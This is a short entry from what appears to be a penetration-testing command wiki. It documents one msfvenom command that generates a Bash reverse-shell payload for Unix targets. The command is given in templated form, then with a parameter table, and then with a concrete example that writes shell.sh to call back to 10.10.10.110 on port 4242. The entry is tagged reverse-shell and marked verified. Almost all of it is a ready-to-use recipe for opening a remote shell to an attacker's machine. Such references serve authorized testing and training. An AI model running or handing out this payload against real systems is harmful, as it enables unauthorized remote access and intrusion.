---
id: 3aaf8c80-3f61-4436-9b07-3165b0f62f4f
name: msfvenom-generate-cmd-unix-reverse-bash-raw
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_bash LHOST="$_LHOST" LPORT="$_LPORT" -f raw >
  $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275674+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Unix
tags:
  - bash
  - reverse-shell
verified: true
validated: true
---

# msfvenom-generate-cmd-unix-reverse-bash-raw

## Command

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="$_LHOST" LPORT="$_LPORT" -f raw > $_OUTPUT_FILE
```

## Description

Creates a Bash reverse shell script for Unix targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p cmd/unix/reverse_bash | Bash reverse payload | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f raw | Raw format | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.sh) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
```

## Expected Output

'shell.sh' created. Execute with bash shell.sh.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
